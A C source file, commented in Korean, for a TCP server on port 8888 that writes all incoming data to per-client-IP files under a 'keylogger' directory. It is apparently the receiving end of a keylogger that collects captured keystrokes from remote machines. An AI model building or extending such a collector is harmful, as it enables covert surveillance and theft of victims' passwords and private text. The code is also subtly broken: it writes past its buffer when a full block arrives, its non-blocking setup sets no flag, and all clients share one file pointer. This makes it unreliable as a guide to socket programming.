#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT 8888

int nTotalSockets = 0;

typedef struct socket_info {
	int sock;
	char buf[DEFAULT_BUFLEN];
	int recvbytes;
} SOCKETINFO;

SOCKETINFO *SocketInfoArray[FD_SETSIZE];

FILE* fp;

int AddSocketInfo(int sock);
void RemoveSocketInfo(int nIndex);
int tcpConnect() {
	int Lsocket = -1;
	struct sockaddr_in serverAddr;
	socklen_t addrlen;

	Lsocket = socket(AF_INET, SOCK_STREAM, 0);
	if(Lsocket == -1) {
		perror("socket failed");
		return -1;
	}

	memset(&serverAddr, 0, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = INADDR_ANY;
	serverAddr.sin_port = htons(DEFAULT_PORT);

	if (bind(Lsocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1) {
		perror("bind failed");
		close(Lsocket);
		return -1;
	}

	if (listen(Lsocket, SOMAXCONN) == -1) {
		perror("listen failed");
		close(Lsocket);
		return -1;
	}

	return Lsocket;

}

int nonBlock(int Lsocket) {
	int flags;

	flags = fcntl(Lsocket, F_GETFL, 0);
	if (flags < 0) {
		perror("flags error");
		close(Lsocket);
		return -1;
	}

	if(fcntl(Lsocket, F_SETFL, flags) < 0) {
		perror("nonblocking flags error");
		close(Lsocket);
		return -1;
	}
	return 0;
}

int Callselect(int Lsocket, fd_set* fds) {
	int max_fd, sd;
	FD_ZERO(fds); //파일 디스크립터 세트 초기화
	FD_SET(Lsocket, fds); // 리스닝 소켓 추가
	max_fd = Lsocket;

	for(int i = 0; i < nTotalSockets; i++) { // 기존 클라이언트들과 통신
		sd = SocketInfoArray[i]->sock;

		if (sd > 0) { // 유효한 소켓만 추가
			FD_SET(sd, fds);
		}

		if (sd > max_fd) { // 현재 소켓이 최대 파일 디스크립터보다 크면 갱신함. select에 연결할 갯수 구함.
			max_fd = sd;
		}
	}
	//select() 호출
	if(select(max_fd + 1, fds, NULL, NULL, NULL) < 0) {
		perror("select error\n");
		close(Lsocket);
		exit(EXIT_FAILURE);
		return -1;
	}
	
	return 0;
}

void makeFile(struct sockaddr_in addr) {
	char dir[100] = "/home/babo/keylogger/Ip_files";
	char filename[100] = "";
	char filepath[200] = "";

	sprintf(filename, "%s", inet_ntoa(addr.sin_addr));
	sprintf(filepath, "%s/%s", dir, filename);
	fp = fopen(filepath, "a");
	if (fp == NULL) {
		perror("Cannot open file");
		exit(EXIT_FAILURE);
	}
}

int tcpAccept(int Lsocket, fd_set* fds, struct sockaddr_in* addr) {
	socklen_t addrlen;
	int Csocket = -1;

	addrlen = sizeof(*addr);
	Csocket = accept(Lsocket, (struct sockaddr*)addr, &addrlen);
	if (Csocket < 0) {
		perror("accept error\n");
		return -1;
	}
	makeFile(*addr);

	printf("Client connected.\n");
	printf("[TCP 서버] 클라이언트 접속: IP 주소=%s, 포트 번호=%d\n", inet_ntoa(addr->sin_addr), ntohs(addr->sin_port));
	FD_SET(Csocket, fds);
	AddSocketInfo(Csocket);

	return Csocket;
}

void tcpRecv(fd_set* fds, struct sockaddr_in* addr) {
	int value;
	socklen_t addrlen;

	for(int i = 0; i < nTotalSockets; i++)
	{
		SOCKETINFO *ptr = SocketInfoArray[i];

		if (FD_ISSET(ptr->sock, fds)) {
			do {
				value = recv(ptr->sock, ptr->buf, DEFAULT_BUFLEN, 0);
				if(value > 0) {
					ptr->buf[value] = '\0';

					fprintf(fp, "%s", ptr->buf);
					fflush(fp);
					ptr->recvbytes = value;
					addrlen = sizeof(*addr);
					getpeername(ptr->sock, (struct sockaddr *)addr, &addrlen);
				}
				else if (value == 0) {
					printf("IP %s Connection closed.\n", inet_ntoa(addr->sin_addr));
					FD_CLR(ptr->sock, fds);
					close(ptr->sock);
					RemoveSocketInfo(i);

					fclose(fp);

					break;
				}
				else {
					printf("recv failed with error");
					FD_CLR(ptr->sock, fds);
					close(ptr->sock);
					RemoveSocketInfo(i);
					fclose(fp);
					break;
				}
			} while(value > 0);
		}
	}
}

int main() {
	//변수선언
	int listenSocket, clientSocket = -1, value;
	struct sockaddr_in clientAddr;
	socklen_t addrlen;
	fd_set readfds;
	
	//connect
	listenSocket = tcpConnect();
	if (listenSocket == -1) return 1;

	printf("Waiting for client...\n");

	//nonblocking
	value = nonBlock(listenSocket);
	if (value == -1) return 1;
 
	while(1) {
		//select
		value = Callselect(listenSocket, &readfds);
		if (value == -1) return 1;

		//accept
		if(FD_ISSET(listenSocket, &readfds)) { //새로운 클라이언트 연결 시 실행
			clientSocket = tcpAccept(listenSocket, &readfds, &clientAddr);
			if(clientSocket == -1) continue;
		}

		//receive
		tcpRecv(&readfds, &clientAddr);
	}

	close(clientSocket);
	close(listenSocket);
	return 0;
}	

int AddSocketInfo(int clientSocket) { // select()할 목록에 소켓 추가.
	if (nTotalSockets >= FD_SETSIZE) {
		printf("Error: can't add socketinformation.\n");
		return 0;
	}

	SOCKETINFO *ptr = (SOCKETINFO *)malloc(sizeof(SOCKETINFO));
	if (ptr == NULL) {
		printf("Error: memory doesn't exist.\n");
		return 0;
	}

	ptr->sock = clientSocket;
	ptr->recvbytes = 0;
	SocketInfoArray[nTotalSockets++] = ptr;

	printf("Added new socket info: Socket=%d, Index=%d\n", clientSocket, nTotalSockets);
	return 1;
}

void RemoveSocketInfo(int nIndex) { // select()할 목록에 소켓 삭제.
	if (nIndex < 0 || nIndex >= nTotalSockets) {
		return;
	}

	free(SocketInfoArray[nIndex]);

	for(int i = nIndex; i < nTotalSockets - 1; i++) {
		SocketInfoArray[i] = SocketInfoArray[i+1];
	}

	--nTotalSockets;

	return;
}
